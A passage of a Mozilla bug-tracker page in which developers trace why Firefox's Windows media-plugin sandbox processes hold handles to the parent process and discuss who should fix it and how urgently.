Also, does Google Chrome have a similar handle to the parent process in its child processes?</pre><div class="activity"><div class="change">Flags: needinfo?(bobowencode) &rarr; needinfo?(nils)</div></div></div><div class="change-set" id="c8"><div class="comment" data-id="9748797" data-no="8"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-8" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_344130" id="a15718_7044"><img src="https://secure.gravatar.com/avatar/1ac8e01cc88bca015e51fbd49a0b2df5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_344130" id="a15718_7044"><a class="email " href="/user_profile?user_id=344130" > <span class="fna">Nils</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-8"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-8" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c8">Comment 8</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-03 11:04 PST" data-time="1420311893">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-8">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-8" data-comment-id="9748797">Bob - I used this test page ( <a rel="nofollow" href="http://mozilla.github.io/webrtc-landing/pc_test.html">http://mozilla.github.io/webrtc-landing/pc_test.html</a> ) with &quot;Require H.264&quot; checked and had the video stream running for a few seconds before attaching to the child.

The Google Chrome renderer or GPU child processes don't have any handles to processes.

I found a related discussion in the chromium bug tracker which suggests that bInheritHandles can be false if the handles are inherited explicitly:
<a rel="nofollow" href="https://code.google.com/p/chromium/issues/detail?id=171836">https://code.google.com/p/chromium/issues/detail?id=171836</a></pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(nils)</span></div></div></div><div class="change-set" id="c9"><div class="comment" data-id="9748826" data-no="9"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-9" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_458623" id="a15718_7044"><img src="https://secure.gravatar.com/avatar/8877ff082c9a902bbf383dc11c1aeffc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_458623" id="a15718_7044"><a class="email " href="/user_profile?user_id=458623" > <span class="fna">Bob Owen (:bobowen)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-9"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-9" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c9">Comment 9</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-03 11:44 PST" data-time="1420314283">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-9">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-9" data-comment-id="9748826">(In reply to Nils from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c8">comment #8</a>)
<span class="quote">&gt; Bob - I used this test page (
&gt; <a rel="nofollow" href="http://mozilla.github.io/webrtc-landing/pc_test.html">http://mozilla.github.io/webrtc-landing/pc_test.html</a> ) with &quot;Require H.264&quot;
&gt; checked and had the video stream running for a few seconds before attaching
&gt; to the child.
&gt; 
&gt; The Google Chrome renderer or GPU child processes don't have any handles to
&gt; processes.
&gt; 
&gt; I found a related discussion in the chromium bug tracker which suggests that
&gt; bInheritHandles can be false if the handles are inherited explicitly:
&gt; <a rel="nofollow" href="https://code.google.com/p/chromium/issues/detail?id=171836">https://code.google.com/p/chromium/issues/detail?id=171836</a></span >

Thanks Nils.
I'm not sure that's quite what the discussion is saying.

However, if this is causing the issue, maybe we can only inherit for debug builds or release builds with a runtime flag / env var.

I'm not sure how much time I'll have to look at this before Monday.</pre></div><div class="change-set" id="c10"><div class="comment" data-id="9748839" data-no="10"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-10" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_11539" id="a15718_7044"><img src="https://secure.gravatar.com/avatar/ae002109ba1cfbb7f5ad990cc5d9fbaf?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_11539" id="a15718_7044"><a class="email " href="/user_profile?user_id=11539" > <span class="fna">Randell Jesup [:jesup] (needinfo me)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-10"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-10" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c10">Comment 10</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-03 12:02 PST" data-time="1420315339">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-10">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-10" data-comment-id="9748839">This should be elsewhere (with the sandboxing stuff, or somewhere in Plugins::)

Bob, can you reassign the product/component?</pre><div class="activity"><div class="change">Flags: needinfo?(bobowencode)</div></div></div><div class="change-set" id="a97724_458623"><div class="change" id="aa97724_458623">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_458623" id="a97724_458623"><img src="https://secure.gravatar.com/avatar/8877ff082c9a902bbf383dc11c1aeffc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_458623" id="a97724_458623"><a class="email " href="/user_profile?user_id=458623" > <span class="fna">Bob Owen (:bobowen)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a97724_458623"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a97724_458623">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a97724_458623">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-03 12:40 PST" data-time="1420317653">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Component: WebRTC: Audio/Video &rarr; Security</div><div class="change">Flags: <span class="activity-deleted">needinfo?(bobowencode)</span></div></div></div><div class="change-set" id="a205770_7044"><div class="change" id="aa205770_7044">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_7044" id="a205770_7044"><img src="https://secure.gravatar.com/avatar/3301a62f3707d6bcef9542d316fb587f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_7044" id="a205770_7044"><a class="email " href="/user_profile?user_id=7044" > <span class="fna">Benjamin Smedberg</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a205770_7044"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a205770_7044">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a205770_7044">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-04 18:41 PST" data-time="1420425699">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Component: Security &rarr; IPC</div></div></div><div class="change-set" id="c11"><div class="comment" data-id="9751651" data-no="11"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-11" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_458623" id="a205770_7044"><img src="https://secure.gravatar.com/avatar/8877ff082c9a902bbf383dc11c1aeffc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_458623" id="a205770_7044"><a class="email " href="/user_profile?user_id=458623" > <span class="fna">Bob Owen (:bobowen)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-11"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-11" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c11">Comment 11</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-05 04:43 PST" data-time="1420461829">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-11">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-11" data-comment-id="9751651">OK, if I try to set inherit handles to false the CreateProcessAsUserW call (in TargetProcess::Create) fails with an ERROR_INVALID_PARAMETER.
So, it seems like you have to have inherit handles as true if you want to pass a handle list to limit the inheritance.

I've also tried commenting out the inheritance code in BrokerServicesBase::SpawnTarget entirely and passing inherit handles as false.
The Process handles to the parent process still appear, so it must be something else that is doing this.
Trying to track it down at the moment, it is appears to be after this point at least:
<a rel="nofollow" href="http://dxr.mozilla.org/mozilla-central/source/toolkit/xre/nsEmbedFunctions.cpp#440">http://dxr.mozilla.org/mozilla-central/source/toolkit/xre/nsEmbedFunctions.cpp#440</a></pre></div><div class="change-set" id="c12"><div class="comment" data-id="9751655" data-no="12"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-12" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_458623" id="a205770_7044"><img src="https://secure.gravatar.com/avatar/8877ff082c9a902bbf383dc11c1aeffc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_458623" id="a205770_7044"><a class="email " href="/user_profile?user_id=458623" > <span class="fna">Bob Owen (:bobowen)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-12"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-12" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c12">Comment 12</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-05 04:46 PST" data-time="1420461977">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-12">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-12" data-comment-id="9751655">In fact very shortly after that point, the handle is acquired initially here:
<a rel="nofollow" href="http://dxr.mozilla.org/mozilla-central/source/toolkit/xre/nsEmbedFunctions.cpp#457">http://dxr.mozilla.org/mozilla-central/source/toolkit/xre/nsEmbedFunctions.cpp#457</a>

Looks like it is copied (or re-acquired) three times for some reason shortly afterwards.</pre></div><div class="change-set" id="c13"><div class="comment" data-id="9752039" data-no="13"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-13" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_458623" id="a205770_7044"><img src="https://secure.gravatar.com/avatar/8877ff082c9a902bbf383dc11c1aeffc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_458623" id="a205770_7044"><a class="email " href="/user_profile?user_id=458623" > <span class="fna">Bob Owen (:bobowen)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-13"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-13" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c13">Comment 13</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-05 06:40 PST" data-time="1420468856">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-13">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-13" data-comment-id="9752039">(In reply to Bob Owen (:bobowen) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c12">comment #12</a>)
<span class="quote">&gt; In fact very shortly after that point, the handle is acquired initially here:
&gt; <a rel="nofollow" href="http://dxr.mozilla.org/mozilla-central/source/toolkit/xre/nsEmbedFunctions">http://dxr.mozilla.org/mozilla-central/source/toolkit/xre/nsEmbedFunctions</a>.
&gt; cpp#457
&gt; 
&gt; Looks like it is copied (or re-acquired) three times for some reason shortly
&gt; afterwards.</span >

The others are newly acquired at:
<a rel="nofollow" href="http://dxr.mozilla.org/mozilla-central/source/gfx/layers/ipc/CompositorChild.cpp#81">http://dxr.mozilla.org/mozilla-central/source/gfx/layers/ipc/CompositorChild.cpp#81</a>
<a rel="nofollow" href="http://dxr.mozilla.org/mozilla-central/source/gfx/layers/ipc/ImageBridgeChild.cpp#578">http://dxr.mozilla.org/mozilla-central/source/gfx/layers/ipc/ImageBridgeChild.cpp#578</a>
<a rel="nofollow" href="http://dxr.mozilla.org/mozilla-central/source/ipc/glue/BackgroundImpl.cpp#1675">http://dxr.mozilla.org/mozilla-central/source/ipc/glue/BackgroundImpl.cpp#1675</a>

This is for the content process, the GMP process only has the one from nsEmbedFunctions.
So, it looks like these handles need to be closed after they are no longer needed or maybe the permissions on them need to be tightened.</pre></div><div class="change-set" id="c14"><div class="comment" data-id="9752336" data-no="14"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-14" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_458623" id="a205770_7044"><img src="https://secure.gravatar.com/avatar/8877ff082c9a902bbf383dc11c1aeffc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_458623" id="a205770_7044"><a class="email " href="/user_profile?user_id=458623" > <span class="fna">Bob Owen (:bobowen)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-14"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-14" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c14">Comment 14</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-05 07:48 PST" data-time="1420472892">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-14">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-14" data-comment-id="9752336">The IPDL generated code seems to store the parent process handle and use it for logging.
Not sure how else it might be used.

I don't think I'm the best person to continue looking at this.</pre><div class="activity"><div class="change">Flags: needinfo?(benjamin)</div></div></div><div class="change-set" id="c15"><div class="comment" data-id="9753971" data-no="15"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-15" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_7044" id="a205770_7044"><img src="https://secure.gravatar.com/avatar/3301a62f3707d6bcef9542d316fb587f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_7044" id="a205770_7044"><a class="email " href="/user_profile?user_id=7044" > <span class="fna">Benjamin Smedberg</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-15"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-15" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c15">Comment 15</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-05 12:38 PST" data-time="1420490313">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-15">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-15" data-comment-id="9753971">I don't know offhand what we use the handle for; I'd have to deep-dive in the history. I'm guessing that it's just a PID or something and we could easily refactor it to avoid the handle, but I don't know.

I don't know who else would own this bug... maybe jimm?</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(benjamin)</span></div></div></div><div class="change-set" id="a270402_7044"><div class="change" id="aa270402_7044">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_7044" id="a270402_7044"><img src="https://secure.gravatar.com/avatar/3301a62f3707d6bcef9542d316fb587f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_7044" id="a270402_7044"><a class="email " href="/user_profile?user_id=7044" > <span class="fna">Benjamin Smedberg</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a270402_7044"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a270402_7044">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a270402_7044">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-05 12:38 PST" data-time="1420490331">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: needinfo?(jmathies)</div></div></div><div class="change-set" id="c16"><div class="comment" data-id="9754202" data-no="16"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-16" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a270402_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a270402_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-16"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-16" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c16">Comment 16</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-05 13:15 PST" data-time="1420492540">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-16">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-16" data-comment-id="9754202">I can take this, although I'd like to figure out what the priority is because I have other pressing stuff I'm working on at the moment.

From my understanding we currently have a non-restrictive sandbox enabled in Nightly. I'm not sure if that's rolling out any time soon. Higher level restrictions are still being worked on.

So this should probably block general sandboxing rollout.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(jmathies)</span></div></div></div><div class="change-set" id="c17"><div class="comment" data-id="9754219" data-no="17"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-17" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_7044" id="a270402_7044"><img src="https://secure.gravatar.com/avatar/3301a62f3707d6bcef9542d316fb587f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_7044" id="a270402_7044"><a class="email " href="/user_profile?user_id=7044" > <span class="fna">Benjamin Smedberg</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-17"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-17" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c17">Comment 17</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-05 13:18 PST" data-time="1420492719">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-17">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-17" data-comment-id="9754219">This is most important in terms of the GMP sandbox which is already in production. The e10s sandbox could easily wait a while.</pre></div><div class="change-set" id="c18"><div class="comment" data-id="9754238" data-no="18"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-18" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_181004" id="a270402_7044"><img src="https://secure.gravatar.com/avatar/2e65c829d6f9d9ccf3e84753a00fb8aa?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_181004" id="a270402_7044"><a class="email " href="/user_profile?user_id=181004" > <span class="fna">Brad Lassey [:blassey] (use needinfo?)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-18"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-18" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c18">Comment 18</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-05 13:21 PST" data-time="1420492904">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-18">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-18" data-comment-id="9754238">(In reply to Jim Mathies [:jimm] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c16">comment #16</a>)
<span class="quote">&gt; So this should probably block general sandboxing rollout.</span >
I think the thing we care most about right now is sandboxing the GMP process. So if we can get a fix for that in the short term, I think we can move on and worry about the general problem later. Right?</pre></div><div class="change-set" id="c19"><div class="comment" data-id="9754264" data-no="19"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-19" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a270402_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a270402_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-19"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-19" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c19">Comment 19</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-05 13:26 PST" data-time="1420493189">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-19">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-19" data-comment-id="9754264">Hmm, so I wasn't aware that we have a fully locked down chromium sandbox in use on the release channel for GMP. I guess we need to get this fixed and uplifted asap.</pre><div class="activity"><div class="change">Assignee: nobody &rarr; jmathies</div></div></div><div class="change-set" id="c20"><div class="comment" data-id="9754567" data-no="20"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-20" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a270402_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a270402_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-20"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-20" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c20">Comment 20</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-05 14:20 PST" data-time="1420496446">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-20">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-20" data-comment-id="9754567">Looks like this landed in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - IPDL: Top-level protocol actors need handles to &quot;other&quot; process"
   href="/show_bug.cgi?id=523761">bug 523761</a>.</pre></div><div class="change-set" id="c21"><div class="comment" data-id="9757511" data-no="21"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-21" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_458623" id="a270402_7044"><img src="https://secure.gravatar.com/avatar/8877ff082c9a902bbf383dc11c1aeffc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_458623" id="a270402_7044"><a class="email " href="/user_profile?user_id=458623" > <span class="fna">Bob Owen (:bobowen)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-21"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-21" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c21">Comment 21</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-06 07:25 PST" data-time="1420557909">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-21">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-21" data-comment-id="9757511">(In reply to Bob Owen (:bobowen) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c14">comment #14</a>)
<span class="quote">&gt; The IPDL generated code seems to store the parent process handle and use it
&gt; for logging.
&gt; Not sure how else it might be used.
&gt; 
&gt; I don't think I'm the best person to continue looking at this.</span >

Examples of the use for logging can be found in obj-i686-pc-mingw32\ipc\ipdl\PGMPChild.cpp (on my machine).
Search for OtherProcess().
The handle is stored in mOtherProcess when Open (PGMPChild::Open) is called in GMPChild::Init.</pre></div><div class="change-set" id="c22"><div class="comment" data-id="9758334" data-no="22"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-22" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a270402_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a270402_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-22"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-22" >
